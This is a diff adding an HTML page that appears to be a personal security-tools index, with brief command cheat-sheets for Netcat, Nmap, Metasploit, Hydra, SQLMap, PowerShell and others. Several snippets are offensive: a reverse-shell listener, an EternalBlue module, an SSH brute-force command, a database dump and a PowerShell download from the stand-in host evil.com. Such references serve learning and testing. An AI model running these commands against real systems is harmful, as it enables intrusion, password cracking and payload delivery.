@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Tools - Zero Trust</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+  <header style="padding: 4rem 1rem;">
+    <div class="nav-bar">
+        <a href="index.html">Home</a>
+        <a href="tools.html" class="active">Tools</a>
+    </div>
+    <h1>Security Tools Index</h1>
+    <p>A curated list of SOC, OSINT, and Offensive Security tools.</p>
+  </header>
+
+  <main>
+    <div class="search-container">
+        <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords...">
+    </div>
+
+    <div id="toolsGrid" class="grid-container">
+        <!-- Tools will be populated here -->
+
+        <!-- Networking -->
+        <div class="tool-card" data-keywords="netcat nc network listener reverse shell">
+            <div class="tool-header">
+                <h3 class="tool-title">Netcat (nc)</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">The "Swiss Army knife" of networking. Used for reading/writing data across network connections.</div>
+            <div class="tool-flags">
+<strong># Listen on port 4444 (Reverse Shell Listener)</strong>
+nc -lvnp 4444
+
+<strong># Connect to a port</strong>
+nc -v &lt;target_ip&gt; &lt;port&gt;
+
+<strong># File Transfer (Receiver)</strong>
+nc -lvnp 1234 &gt; received_file
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="nmap network scanner reconnaissance">
+            <div class="tool-header">
+                <h3 class="tool-title">Nmap</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">Network exploration tool and security / port scanner.</div>
+            <div class="tool-flags">
+<strong># Aggressive Scan (OS, Services, Scripts)</strong>
+nmap -A -v &lt;target_ip&gt;
+
+<strong># Scan specific ports</strong>
+nmap -p 80,443,8080 &lt;target_ip&gt;
+
+<strong># Scan all ports</strong>
+nmap -p- &lt;target_ip&gt;
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="wireshark network analyzer packet capture pcap">
+            <div class="tool-header">
+                <h3 class="tool-title">Wireshark</h3>
+                <span class="tool-category cat-net">Networking</span>
+            </div>
+            <div class="tool-desc">The world's foremost network protocol analyzer.</div>
+            <div class="tool-flags">
+<strong># Filter by IP</strong>
+ip.addr == 192.168.1.10
+
+<strong># Filter by Protocol</strong>
+http || dns
+
+<strong># Follow TCP Stream</strong>
+Right-click packet -> Follow -> TCP Stream
+            </div>
+        </div>
+
+        <!-- Exploitation -->
+        <div class="tool-card" data-keywords="metasploit framework msfconsole exploit">
+            <div class="tool-header">
+                <h3 class="tool-title">Metasploit Framework</h3>
+                <span class="tool-category cat-exp">Exploitation</span>
+            </div>
+            <div class="tool-desc">The world's most used penetration testing framework.</div>
+            <div class="tool-flags">
+<strong># Start Console</strong>
+msfconsole
+
+<strong># Search for module</strong>
+search type:exploit platform:windows eternalblue
+
+<strong># Use module</strong>
+use exploit/windows/smb/ms17_010_eternalblue
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="searchsploit exploitdb exploit database">
+            <div class="tool-header">
+                <h3 class="tool-title">Searchsploit</h3>
+                <span class="tool-category cat-exp">Exploitation</span>
+            </div>
+            <div class="tool-desc">Command line search tool for Exploit-DB.</div>
+            <div class="tool-flags">
+<strong># Search for exploit</strong>
+searchsploit apache 2.4
+
+<strong># Mirror exploit to current dir</strong>
+searchsploit -m &lt;id&gt;
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="hydra brute force password cracker">
+            <div class="tool-header">
+                <h3 class="tool-title">Hydra</h3>
+                <span class="tool-category cat-exp">Exploitation</span>
+            </div>
+            <div class="tool-desc">A very fast network logon cracker which supports many different services.</div>
+            <div class="tool-flags">
+<strong># SSH Brute Force</strong>
+hydra -l user -P passlist.txt ssh://192.168.1.10
+            </div>
+        </div>
+
+        <!-- Web -->
+        <div class="tool-card" data-keywords="burp suite web proxy scanner intercept">
+            <div class="tool-header">
+                <h3 class="tool-title">Burp Suite</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">An integrated platform for performing security testing of web applications.</div>
+            <div class="tool-flags">
+<strong># Intercept</strong>
+Proxy -> Intercept -> Intercept is on
+
+<strong># Repeater</strong>
+Send request to Repeater (Ctrl+R) to modify and resend.
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="gobuster directory dns vhost brute force">
+            <div class="tool-header">
+                <h3 class="tool-title">Gobuster</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">Directory/File, DNS and VHost busting tool written in Go.</div>
+            <div class="tool-flags">
+<strong># Directory Scan</strong>
+gobuster dir -u http://example.com -w /path/to/wordlist.txt
+
+<strong># DNS Subdomain Scan</strong>
+gobuster dns -d example.com -w /path/to/wordlist.txt
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="sqlmap sql injection database takeover">
+            <div class="tool-header">
+                <h3 class="tool-title">SQLMap</h3>
+                <span class="tool-category cat-web">Web</span>
+            </div>
+            <div class="tool-desc">Automatic SQL injection and database takeover tool.</div>
+            <div class="tool-flags">
+<strong># Basic Scan</strong>
+sqlmap -u "http://example.com/page.php?id=1" --dbs
+
+<strong># Dump Database</strong>
+sqlmap -u "..." -D dbname --dump
+            </div>
+        </div>
+
+        <!-- Forensics -->
+        <div class="tool-card" data-keywords="volatility memory forensics ram analysis">
+            <div class="tool-header">
+                <h3 class="tool-title">Volatility</h3>
+                <span class="tool-category cat-for">Forensics</span>
+            </div>
+            <div class="tool-desc">Advanced memory forensics framework.</div>
+            <div class="tool-flags">
+<strong># Image Info (Vol 2)</strong>
+volatility -f memory.dmp imageinfo
+
+<strong># Process List</strong>
+volatility -f memory.dmp --profile=&lt;profile&gt; pslist
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="autopsy digital forensics sleuth kit">
+            <div class="tool-header">
+                <h3 class="tool-title">Autopsy</h3>
+                <span class="tool-category cat-for">Forensics</span>
+            </div>
+            <div class="tool-desc">The premier open source digital forensics platform. GUI for The Sleuth Kit.</div>
+        </div>
+
+        <div class="tool-card" data-keywords="ftk imager disk imaging forensics">
+            <div class="tool-header">
+                <h3 class="tool-title">FTK Imager</h3>
+                <span class="tool-category cat-for">Forensics</span>
+            </div>
+            <div class="tool-desc">Data preview and imaging tool. Used to acquire memory and disk images.</div>
+        </div>
+
+        <!-- OSINT -->
+        <div class="tool-card" data-keywords="sherlock osint username search social media">
+            <div class="tool-header">
+                <h3 class="tool-title">Sherlock</h3>
+                <span class="tool-category cat-osint">OSINT</span>
+            </div>
+            <div class="tool-desc">Hunt down social media accounts by username across social networks.</div>
+            <div class="tool-flags">
+<strong># Search Username</strong>
+python3 sherlock.py username
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="maltego osint link analysis graph">
+            <div class="tool-header">
+                <h3 class="tool-title">Maltego</h3>
+                <span class="tool-category cat-osint">OSINT</span>
+            </div>
+            <div class="tool-desc">Open source intelligence and forensics application. It offers visual link analysis.</div>
+        </div>
+
+        <div class="tool-card" data-keywords="theharvester osint emails subdomains">
+            <div class="tool-header">
+                <h3 class="tool-title">TheHarvester</h3>
+                <span class="tool-category cat-osint">OSINT</span>
+            </div>
+            <div class="tool-desc">Gather emails, subdomains, hosts, employee names, open ports and banners.</div>
+            <div class="tool-flags">
+<strong># Basic Search</strong>
+theHarvester -d example.com -b all
+            </div>
+        </div>
+
+        <!-- Misc / SOC / Other Tools List -->
+         <div class="tool-card" data-keywords="sysinternals procmon procexp autoruns windows">
+            <div class="tool-header">
+                <h3 class="tool-title">Sysinternals Suite</h3>
+                <span class="tool-category cat-for">Forensics/Admin</span>
+            </div>
+            <div class="tool-desc">Essential Windows troubleshooting utilities (ProcMon, ProcExp, Autoruns, PsExec).</div>
+        </div>
+
+        <div class="tool-card" data-keywords="powershell lolbas scripting windows">
+            <div class="tool-header">
+                <h3 class="tool-title">PowerShell</h3>
+                <span class="tool-category cat-net">LOLBAS</span>
+            </div>
+            <div class="tool-desc">Task automation and configuration management framework. Often used for LOLBAS attacks.</div>
+            <div class="tool-flags">
+<strong># Download File</strong>
+Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
+
+<strong># Base64 Encode</strong>
+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("string"))
+            </div>
+        </div>
+
+        <div class="tool-card" data-keywords="cyberchef decoding encoding crypto magic">
+            <div class="tool-header">
+                <h3 class="tool-title">CyberChef</h3>
+                <span class="tool-category cat-exp">General</span>
+            </div>
+            <div class="tool-desc">The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis.</div>
+        </div>
+
+        <div class="tool-card" data-keywords="ghidra reverse engineering nsa disassembler">
+            <div class="tool-header">
+                <h3 class="tool-title">Ghidra</h3>
+                <span class="tool-category cat-for">Reversing</span>
+            </div>
+            <div class="tool-desc">A software reverse engineering (SRE) suite of tools developed by NSA.</div>
+        </div>
+
+        <!-- Add more placeholders for the massive list -->
+         <div class="tool-card" data-keywords="list of other tools unclassified">
+            <div class="tool-header">
+                <h3 class="tool-title">Other Tools</h3>
+                <span class="tool-category cat-exp">Index</span>
+            </div>
+            <div class="tool-desc">
+                <p><strong>Networking:</strong> Socat, SSH, OpenVPN, TCPDump, TShark, Zeek, Snort, Suricata, Nagios, Zscaler, Proxmox, Kubernetes, Docker.</p>
+                <p><strong>Web:</strong> OWASP ZAP, Caido, WPScan, Feroxbuster, Dirb, Nikto, WhatWeb, ffuf, EvilGinx2, GoPhish.</p>
+                <p><strong>Enumeration:</strong> Masscan, RustScan, Enum4linux, AdGuard, DNSRecon, NSLookup, Dig, Whois, Amass.</p>
+                <p><strong>Exploitation:</strong> John the Ripper, Hashcat, CrackMapExec (NetExec), Evil-WinRM, Impacket, Responder, Mimikatz.</p>
+                <p><strong>Forensics:</strong> Rekall, GRR, KAPE, Zimmerman Tools, ExifTool, Binwalk, Strings, FLOSS, PEStudio, ProcMon.</p>
+                <p><strong>OSINT:</strong> Holehe, PhoneInfoga, Waybackurls, Gowitness.</p>
+            </div>
+        </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <p>&copy; Zero Trust. Hosted with ❤️ on GitHub Pages.</p>
+  </footer>
+
+  <script>
+    const searchInput = document.getElementById('searchInput');
+    const toolCards = document.querySelectorAll('.tool-card');
+
+    searchInput.addEventListener('input', (e) => {
+        const searchTerm = e.target.value.toLowerCase();
+
+        toolCards.forEach(card => {
+            const title = card.querySelector('.tool-title').textContent.toLowerCase();
+            const keywords = card.getAttribute('data-keywords') ? card.getAttribute('data-keywords').toLowerCase() : '';
+            const desc = card.querySelector('.tool-desc').textContent.toLowerCase();
+            const flags = card.querySelector('.tool-flags') ? card.querySelector('.tool-flags').textContent.toLowerCase() : '';
+
+            if (title.includes(searchTerm) || keywords.includes(searchTerm) || desc.includes(searchTerm) || flags.includes(searchTerm)) {
+                card.classList.remove('hidden');
+            } else {
+                card.classList.add('hidden');
+            }
+        });
+    });
+  </script>
+</body>
+</html>
